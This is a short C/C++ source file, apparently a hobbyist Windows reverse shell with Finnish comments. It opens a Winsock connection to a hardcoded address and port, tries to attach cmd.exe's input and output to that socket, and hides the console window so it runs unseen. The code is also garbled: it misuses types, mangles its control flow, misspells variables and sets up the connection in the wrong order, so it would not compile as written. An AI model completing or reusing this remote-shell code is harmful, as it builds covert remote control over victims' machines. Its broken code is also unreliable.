#include <windows.h>
#include <unistd.h>
#include <timelib.h>
#include <time.h>
#include <minwinbase.h>
#include <sysinfoapi.h>
#include <iomanip>
#include <winsock2.h>

void Structure{
    string ip_lib();

    void RecordTime(int record, int systemTime);
    void Save(int Save, int file);
   void  runInBackground();
   char buffer[100];
   string rules();
   string randomPacket(int n);
   WSADATA wsa;
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   const char* routingRelationship = NULL;
   int ip_addr = "192.1698.0" // Vaihda; 
   int port = "8080";
   inet_addr shell_addrs;
   SHELL socket;
   LPWSABUF cd; //Keksi joku toinen
   LPQOS ls;



}

std::Structure::exec(const char* cmd)
{
    int result = "";
    FILE* pipe = popen(cmd, "r");
    result += buffer;
    if (!pipe) throw std::runtime_error("popen() Failed");

    while (1)
    {
        try {
            catch (...)
            {
                pclose(pipe);
                throw

                    pclose(pipe);
                return;


            }

        }

    }
}


int main()
{
    ip_lib = randomPacket(n);
    buffer[100];
    runInBackground();


    while (1)
    {
        WSAStartup(MAKEWORD(2, 2), &wsa);

        //Luo socket
        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL(unsigned int), NULL(unsigned int), NULL(unsigned int), NULL(unsigned int));

        if (!shell)
        {
            printf("[!] AN Error happened please try again\n");
            exit(0);

        }
    }
    connect = WSAConnect(shell, (MAKEWORD*), &shell_addr, sizeof(shell_addrs), &cd, &ls);

    shell_addrs.sin_port = htons(port);
    shell_addrs.sin_family = AF_INET;
    shell_adrs.s_addr.ip_addrs = inet_addr(ip_addr);
    printf("Making Connections");

    if (connection == SOCKET_ERROR)
    {
        printf("[!] Please try again\n");
        exit();
    }
    createProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL);
    WaitForSingleObject(pi.hProcess, INFINITE);
    pi.dwFlags = (STARTF_USESTDHANDLES || STARTF_USESHOWWINDOW);
    pi.hStdInput = pi.hStdOutput = pi.hStdError = (HANDLE)shell; 
    CloseHandle(hProcess);
    CloseHandle(hThread);

    //Make a frienship with the Router

}

//Run in background

void runInbackground()
{
    HWND window;
    AllocConsole();

    window = CreateWindowA("consoleWindowClass", "cmd.exe");
    ShowWindow(window, 0);
    return 0;


}
